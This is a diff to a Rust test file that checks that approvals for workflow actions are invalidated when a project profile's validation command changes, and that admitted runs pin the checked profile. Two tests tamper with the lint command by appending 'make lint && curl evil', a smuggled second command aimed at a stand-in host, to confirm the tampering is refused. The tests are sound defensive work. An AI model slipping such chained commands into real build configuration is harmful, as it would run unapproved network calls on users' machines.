@@ -159,13 +159,16 @@ async fn admitted_run(
     launch_id: String,
     before_check: impl FnOnce(&rusqlite::Connection) + Send + 'static,
 ) -> Result<crate::models::WorkflowRun, String> {
-    let admission: crate::api::workflows::RunAdmission = Box::new(move |conn, snapshot| {
-        before_check(conn);
-        Ok(
-            crate::db::live_page_action_trusts::admit_run(conn, &launch_id, snapshot)?
+    let admission: crate::api::workflows::RunAdmission =
+        Box::new(move |conn, snapshot, profiles| {
+            before_check(conn);
+            Ok(
+                crate::db::live_page_action_trusts::admit_run(
+                    conn, &launch_id, snapshot, profiles,
+                )?
                 .map_err(|refusal| refusal.to_string()),
-        )
-    });
+            )
+        });
     crate::api::workflows::create_manual_run_admitted(
         state,
         "wf-move",
@@ -264,4 +267,150 @@ async fn a_trusted_run_executes_only_the_definition_admitted_with_its_approval()
 
 fn workflow_payload() -> Option<serde_json::Value> {
     workflow().steps[0].json_data_payload.clone()
+}
+
+// ─── KT-920 — the approval, the admission and the pin share one profile ───
+
+const PROJECT: &str = "proj-trust-profile";
+const PROFILE: &str = "schema_version = 1\n[validation.targets.lint]\ncommand = \"make lint\"\n";
+
+fn git(dir: &std::path::Path, args: &[&str]) {
+    let output = crate::core::cmd::git_cmd()
+        .arg("-C")
+        .arg(dir)
+        .args(args)
+        .output()
+        .unwrap();
+    assert!(output.status.success(), "git {args:?}");
+}
+
+fn commit(dir: &std::path::Path, path: &str, text: &str) {
+    let file = dir.join(path);
+    std::fs::create_dir_all(file.parent().unwrap()).unwrap();
+    std::fs::write(file, text).unwrap();
+    git(dir, &["add", "-A"]);
+    git(dir, &["commit", "-qm", path]);
+}
+
+async fn seeded_with_profile() -> (AppState, tempfile::TempDir) {
+    let state = state();
+    let repo = tempfile::tempdir().unwrap();
+    git(repo.path(), &["init", "-q", "-b", "main"]);
+    git(repo.path(), &["config", "user.email", "t@kronn.local"]);
+    git(repo.path(), &["config", "user.name", "t"]);
+    git(repo.path(), &["config", "commit.gpgsign", "false"]);
+    commit(repo.path(), "kronn/project.toml", PROFILE);
+    let path = repo.path().to_string_lossy().to_string();
+    state
+        .db
+        .with_conn(move |conn| {
+            let now = chrono::Utc::now().to_rfc3339();
+            let project: crate::models::Project = serde_json::from_value(serde_json::json!({
+                "id": PROJECT, "name": PROJECT, "path": path,
+                "repo_url": null, "token_override": null,
+                "ai_config": {"detected": false, "configs": []},
+                "created_at": now, "updated_at": now,
+            }))?;
+            crate::db::projects::insert_project(conn, &project)?;
+            let mut targeted = workflow();
+            targeted.project_id = Some(PROJECT.into());
+            setup(conn, &targeted, Some(PROJECT), &block("todo-move", BOUND));
+            Ok(())
+        })
+        .await
+        .unwrap();
+    (state, repo)
+}
+
+async fn listed_state(
+    state: &AppState,
+) -> crate::db::live_page_action_trusts::LivePageActionTrustState {
+    let Json(listed) = trusts_for_live_page(State(state.clone()), Path(PAGE.into())).await;
+    listed
+        .data
+        .expect("listed")
+        .into_iter()
+        .find(|row| row.action_id == ACTION)
+        .unwrap()
+}
+
+async fn approve_listed(state: &AppState) {
+    let fingerprint = listed_state(state).await.fingerprint.expect("eligible");
+    let Json(approved) = trust(
+        State(state.clone()),
+        None,
+        Path(ACTION.into()),
+        Json(TrustLivePageActionRequest { fingerprint }),
+    )
+    .await;
+    assert!(approved.success, "{:?}", approved.error);
+}
+
+#[tokio::test]
+async fn a_profile_command_change_on_main_invalidates_the_approval() {
+    let (state, repo) = seeded_with_profile().await;
+    approve_listed(&state).await;
+    commit(repo.path(), "README.md", "unrelated");
+    assert!(
+        listed_state(&state).await.active,
+        "a new commit, same values"
+    );
+
+    commit(
+        repo.path(),
+        "kronn/project.toml",
+        &PROFILE.replace("make lint", "make lint && curl evil"),
+    );
+    let changed = listed_state(&state).await;
+    assert!(!changed.active);
+    assert_eq!(
+        changed.trust.unwrap().invalidated_reason,
+        Some(LivePageActionTrustRefusal::Changed)
+    );
+}
+
+#[tokio::test]
+async fn the_admitted_run_pins_the_profile_snapshot_it_was_checked_against() {
+    let (state, repo) = seeded_with_profile().await;
+    approve_listed(&state).await;
+    let fingerprint = listed_state(&state).await.fingerprint.unwrap();
+    let launch = trusted_claim(&state, fingerprint).await;
+    let expected = crate::core::project_profile::snapshot(Some(repo.path()));
+    let run = admitted_run(&state, launch, |_| {})
+        .await
+        .expect("admitted");
+    commit(
+        repo.path(),
+        "kronn/project.toml",
+        &PROFILE.replace("make lint", "make other"),
+    );
+    let run_id = run.id.clone();
+    let pinned = state
+        .db
+        .with_conn(move |conn| {
+            crate::workflows::run_pins::pinned_project_profile(conn, &run_id, Some(PROJECT))
+        })
+        .await
+        .unwrap()
+        .expect("the admission pinned the profile");
+    assert_eq!(pinned, expected);
+    assert_eq!(
+        pinned.values["project.validation.targets.lint.command"],
+        "make lint"
+    );
+}
+
+#[tokio::test]
+async fn a_profile_change_between_the_claim_and_the_admission_is_refused() {
+    let (state, repo) = seeded_with_profile().await;
+    approve_listed(&state).await;
+    let fingerprint = listed_state(&state).await.fingerprint.unwrap();
+    let launch = trusted_claim(&state, fingerprint).await;
+    commit(
+        repo.path(),
+        "kronn/project.toml",
+        &PROFILE.replace("make lint", "make lint && curl evil"),
+    );
+    assert!(admitted_run(&state, launch, |_| {}).await.is_err());
+    assert_eq!(run_count(&state).await, 0);
 }
